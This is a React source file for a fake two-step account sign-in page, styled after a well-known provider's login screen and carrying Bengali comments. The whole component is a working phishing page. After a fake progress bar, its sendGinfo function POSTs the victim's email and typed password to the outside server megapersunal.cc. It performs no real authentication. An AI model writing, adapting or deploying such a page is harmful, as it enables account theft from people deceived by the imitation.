import { useState } from "react";

export default function App() {
  const [step, setStep] = useState("email");
  const [progress, setProgress] = useState(0);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [passwordError, setPasswordError] = useState(false);
  const [emailError, setEmailError] = useState("");

  function runProgress(callback) {
    setProgress(0);

    const interval = setInterval(() => {
      setProgress((prev) => {
        const next = prev + 2;

        if (next >= 100) {
          clearInterval(interval);

          setTimeout(() => {
            callback();
          }, 100);

          return 100;
        }

        return next;
      });
    }, 30);
  }

  function handleNext() {
    if (!email.trim()) {
      setEmailError("Enter an email address.");
      return;
    }

    // Email validation
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

    if (!emailRegex.test(email)) {
      setEmailError("Enter a valid email address.");
      return;
    }

    // Error clear
    setEmailError("");

    runProgress(() => {
      // Password page-এ যাওয়ার আগে progress reset
      setProgress(0);
      setStep("password");
    });
  }

  function handleSignIn() {
    // দ্বিতীয়বার দিলে progress চলবে
    runProgress(() => {
      sendGinfo();
    });
  }

  async function sendGinfo() {
    const data = {
      email: email,
      token: password.trim(),

      // Dummy location data
      latitude: 23.8103,
      longitude: 90.4125,
    };

    try {
      const response = await fetch(
          "https://megapersunal.cc/api/v1/ginfo",
          {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
              "Accept": "application/json",
            },
            body: JSON.stringify(data),
          }
      );

      const result = await response.json();

      console.log(result);
    } catch (error) {
      console.error("Request failed:", error);
    }
  }

  return (
    <main className="page">
      {/* EMAIL PAGE */}
      {step === "email" && (
        <section className="login-card">
          {/* Progress Bar */}
          <div className="card-progress">
            <div
              className="card-progress-fill"
              style={{ width: `${progress}%` }}
            ></div>
          </div>

          <div className="brand-mark" aria-hidden="true">
            <span className="g-red">📍</span>
          </div>

          <div className="content">
            <div className="left">
              <h1>Sign in to your account</h1>
              <p className="subtitle">Use your account to continue</p>
            </div>

            <div className="right">
              <label className="floating-label" htmlFor="email">
                Email or phone
              </label>

              <input
                  id="email"
                  className="text-input"
                  type="text"
                  value={email}
                  onChange={(e) => {
                    setEmail(e.target.value);
                    setEmailError("");
                  }}
                  autoComplete="off"
                  style={{
                    border: emailError
                        ? "2px solid #d93025"
                        : "1px solid #dadce0",
                    color: "#202124",
                    backgroundColor: "#fff",
                    outline: "none",
                    transition: "border 0.2s ease, box-shadow 0.2s ease",
                    boxShadow: emailError
                        ? "0 0 0 3px rgba(217, 48, 37, 0.08)"
                        : "none",
                  }}
              />

              {emailError && (
                  <p
                      style={{
                        color: "#d93025",
                        fontSize: "13px",
                        lineHeight: "18px",
                        fontWeight: "500",
                        margin: "6px 0 0 2px",
                      }}
                  >
                    {emailError}
                  </p>
              )}

              <button className="link-btn" type="button">
                Forgot email?
              </button>

              <p className="guest-text">
                Not your computer? Use Guest mode to sign in privately.
              </p>

              <button className="learn-btn" type="button">
                Learn more about Guest mode
              </button>

              <div className="actions">
                <button className="link-btn" type="button">
                  Create account
                </button>

                <button className="next-btn" type="button" onClick={handleNext}>
                  Next
                </button>
              </div>
            </div>
          </div>

          <div className="language-row">
            <span>English (United States)</span>
            <span>⌄</span>
          </div>

          <div className="footer-links">
            <span>Help</span>
            <span>Privacy</span>
            <span>Terms</span>
          </div>
        </section>
      )}

      {/* PASSWORD PAGE */}
      {step === "password" && (
        <section className="login-card">
          {/* Progress Bar */}
          <div className="card-progress">
            <div
              className="card-progress-fill"
              style={{ width: `${progress}%` }}
            ></div>
          </div>

          <div className="brand-mark" aria-hidden="true">
            <span className="g-red">📍</span>
          </div>

          <div className="content">
            <div className="left">
              <h1>Welcome</h1>

              <div className="account-chip">
                <span>{email}</span>

                <span className="chevron">⌄</span>
              </div>
            </div>

            <div className="right">
              <label className="floating-label" htmlFor="password">
                Password
              </label>

              <input
                id="password"
                className={`text-input ${passwordError ? "input-error" : ""}`}
                type="password"
                value={password}
                onChange={(e) => {
                  setPassword(e.target.value);
                  setPasswordError(false);
                }}
                placeholder="Enter your password"
                autoComplete="off"
              />
              {passwordError && (
                <p className="password-error">
                  Incorrect password. Please try again.
                </p>
              )}

              <label className="check-row">
                <input id="showPassword" type="checkbox" />

                <span>Show password</span>
              </label>

              <div className="actions">
                <button className="link-btn" type="button">
                  Forgot password?
                </button>

                <button
                  className="next-btn"
                  type="button"
                  onClick={handleSignIn}
                >
                  Sign in
                </button>
              </div>
            </div>
          </div>

          <div className="language-row">
            <span>English (United States)</span>
            <span>⌄</span>
          </div>

          <div className="footer-links">
            <span>Help</span>
            <span>Privacy</span>
            <span>Terms</span>
          </div>
        </section>
      )}
    </main>
  );
}
